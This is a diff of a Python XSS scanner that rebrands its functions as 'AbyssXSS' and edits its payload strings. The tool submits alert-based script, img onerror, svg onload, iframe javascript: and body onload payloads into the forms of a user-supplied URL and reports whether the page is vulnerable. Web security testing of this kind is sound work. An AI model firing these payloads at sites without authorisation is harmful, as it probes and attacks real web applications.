@@ -86,7 +86,7 @@ def submit_form(form_details, url, value):
         print(f"Error during request: {e}")
         return None
 
-def scan_xss(url, payload, xss_type):
+def AbyssXSS_scan(url, payload, xss_type):
     forms = get_all_forms(url)
     print(f"[+] Detected {len(forms)} forms on {url}.")
     is_vulnerable = False
@@ -110,13 +110,13 @@ def scan_xss(url, payload, xss_type):
 
     return "[*] Vulnerable XSS" if is_vulnerable else "[*] Not XSS Vulnerable"
 
-def display_payload_menu():
+def AbyssXSS_payload_menu():
     payloads = {
         "1": "<script>alert('Reflected XSS')</script>",  
-        "2": "<img src=x onerror=alert('Stored XSS')>",  
-        "3": "<svg onload=alert('DOM XSS')>",  
+        "2": "<img src=x onerror=alert('AbyssXSS!!!')>",  
+        "3": "<svg onload=alert('by abyss DOM XSS')>",  
         "4": "<iframe src='javascript:alert(\"XSS\")'></iframe>",  
-        "5": "<body onload=alert('XSS')>"  
+        "5": "<body onload=alert('by abyss XSS')>"  
     }
 
     print("SELECT XSS PAYLOADS:")
@@ -124,15 +124,15 @@ def display_payload_menu():
     print("[+] 2. Stored XSS")
     print("[+] 3. DOM XSS")
     
-    xss_type_choice = input("Enter the number of the XSS type: ")
+    AbyXSS_choice = input("Enter the number of the XSS type: ")
     
-    if xss_type_choice == "1":
+    if AbyXSS_choice == "1":
         xss_type = "Reflected XSS"
         payload = payloads.get("1") 
-    elif xss_type_choice == "2":
+    elif AbyXSS_choice == "2":
         xss_type = "Stored XSS"
         payload = payloads.get("2")  
-    elif xss_type_choice == "3":
+    elif AbyXSS_choice == "3":
         xss_type = "DOM XSS"
         payload = payloads.get("3")  
     else:
@@ -144,8 +144,8 @@ def display_payload_menu():
 
 if __name__ == "__main__":
     url = input("Enter the XSS Target URL : ")
-    payload, xss_type = display_payload_menu()
-    result = scan_xss(url, payload, xss_type)
+    payload, xss_type = AbyssXSS_payload_menu()
+    result = AbyssXSS_scan(url, payload, xss_type)
     print(result)
 
 
